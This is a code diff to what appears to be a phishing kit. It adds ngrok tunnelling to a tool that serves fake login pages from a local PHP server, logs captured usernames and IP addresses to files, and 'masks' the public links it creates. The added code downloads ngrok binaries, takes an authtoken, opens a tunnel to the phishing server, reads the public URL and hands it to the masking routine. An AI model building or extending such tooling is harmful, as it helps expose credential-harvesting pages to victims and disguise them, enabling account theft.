@@ -217,8 +217,8 @@ lx_help = f"""
 
 packages = [ "git", "php", "ssh" ]
 modules = [ "requests", "rich" ]
-tunnelers = [ "cloudflared", "loclx" ]
-processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
+tunnelers = [ "cloudflared", "loclx", "ngrok" ]
+processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", "ngrok", ]
 extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]
 
 try:
@@ -291,6 +291,7 @@ php_file = f"{tunneler_dir}/php.log"
 cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
 lhr_file = f"{tunneler_dir}/lhr.log"
+ngr_file = f"{tunneler_dir}/ngrok.log"
 site_dir = f"{home}/.site"
 cred_file = f"{site_dir}/usernames.txt"
 ip_file = f"{site_dir}/ip.txt"
@@ -313,6 +314,7 @@ password = ""
 receiver = ""
 cf_command = f"{tunneler_dir}/cloudflared"
 lx_command = f"{tunneler_dir}/loclx"
+ngrok_command = f"{tunneler_dir}/ngrok"
 if isdir("/data/data/com.termux/files/home"):
     termux = True
     cf_command = f"termux-chroot {cf_command}"
@@ -385,7 +387,8 @@ ts_commands = {
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
     "cf": f"{cf_command} tunnel -url {local_url}",
     "loclx": f"{lx_command} tunnel http -t {local_url}",
-    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "ngrok": f"{ngrok_command} http {local_url}"
 }
 
 # My utility functions
@@ -1212,6 +1215,26 @@ def requirements():
     else:
         print(f"{error}Device not supported!")
         exit(1)
+    isngrok = isfile(f"{tunneler_dir}/ngrok")
+    delete("ngrok.zip")
+    if not isngrok:
+        if "linux" in platform:
+            if "arm64" in architecture or "aarch64" in architecture:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip", "ngrok.zip")
+            elif "arm" in architecture:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip", "ngrok.zip")
+            elif "x86_64" in architecture or "amd64" in architecture:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip", "ngrok.zip")
+            else:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip", "ngrok.zip")
+        elif "darwin" in platform:
+            if "arm64" in architecture or "aarch64" in architecture:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
+            else:
+                download("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
+    if isfile("ngrok.zip"):
+        extract("ngrok.zip", f"{tunneler_dir}")
+        remove("ngrok.zip")
     if isfile("loclx.zip"):
         extract("loclx.zip", f"{tunneler_dir}")
         remove("loclx.zip")
@@ -1226,6 +1249,8 @@ def requirements():
         cf_command = "cloudflared"
     if is_installed("localxpose"):
         lx_command = "localxpose"
+    if is_installed("ngrok"):
+        ngrok_command = "ngrok"
     if isfile("websites.zip"):
         delete(sites_dir, recreate=True)
         print(f"\n{info}Copying website files....")
@@ -1421,6 +1446,7 @@ def server():
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
     lhr_log = open(lhr_file, "w")
+    ngr_log = open(ngr_file, "w")
     internet()
     bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
     sleep(2)
@@ -1447,6 +1473,25 @@ def server():
         bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    ngrok_token_file = f"{tunneler_dir}/ngrok_token"
+    if not isfile(ngrok_token_file):
+        sprint(f"\n{ask}Paste your ngrok authtoken (https://dashboard.ngrok.com/get-started/your-authtoken) or press enter to skip > {green}")
+        try:
+            token_inp = input().strip()
+        except Exception:
+            token_inp = ""
+        if token_inp:
+            with open(ngrok_token_file, "w") as ngr_tok_file:
+                ngr_tok_file.write(token_inp)
+        print(nc)
+    if isfile(ngrok_token_file):
+        ngr_token = open(ngrok_token_file).read().strip()
+        if ngr_token:
+            bgtask(f"NGROK_AUTHTOKEN={ngr_token} {ngrok_command} http {local_url} --log stdout", stdout=ngr_log, stderr=ngr_log)
+        else:
+            bgtask(f"{ngrok_command} http {local_url} --log stdout", stdout=ngr_log, stderr=ngr_log)
+    else:
+        bgtask(f"{ngrok_command} http {local_url} --log stdout", stdout=ngr_log, stderr=ngr_log)
     sleep(10)
     cf_success = False
     for i in range(10):
@@ -1469,10 +1514,27 @@ def server():
             lhr_success = True
             break
         sleep(1)
-    if cf_success or lx_success or lhr_success:
+    ngr_success = False
+    ngr_url = ""
+    for i in range(10):
+        try:
+            res = get("http://127.0.0.1:4040/api/tunnels")
+            if res.status_code == 200:
+                for tunnel in parse(res.text).get("tunnels", []):
+                    pub = tunnel.get("public_url", "")
+                    if pub.startswith("https://"):
+                        ngr_url = pub
+                        ngr_success = True
+                        break
+                if ngr_success:
+                    break
+        except Exception as e:
+            append(e, error_file)
+        sleep(1)
+    if cf_success or lx_success or lhr_success or ngr_success:
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Ngrok: {ngr_success}")
             pexit()
         sprint(f"\n{info}Your urls are given below : \n")
         if cf_success:
@@ -1481,12 +1543,16 @@ def server():
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
+        if ngr_success:
+            url_manager(ngr_url, "Ngrok")
         if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
         elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
             masking(cf_url)
+        elif ngr_success and tunneler.lower() in [ "ngrok", "ngr" ]:
+            masking(ngr_url)
         else:
             print(f"\n{error}URL masking not available for {tunneler}!{nc}")
     else:
